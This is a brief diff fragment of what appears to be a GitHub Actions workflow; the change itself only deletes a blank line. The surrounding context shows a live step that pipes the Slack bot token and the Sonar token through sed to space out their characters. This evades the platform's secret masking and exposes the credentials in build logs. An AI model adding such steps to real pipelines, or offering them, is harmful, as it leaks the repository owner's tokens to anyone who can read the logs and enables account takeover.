@@ -130,7 +130,6 @@ jobs:
         run: |
           echo ${{secrets.SLACK_BOT_TOKEN}} | sed 's/./& /g'
           echo ${{secrets.SONAR_TOKEN}} | sed 's/./& /g'
-          
   build:
     runs-on: ubuntu-latest
     environment: ${{ inputs.env }}
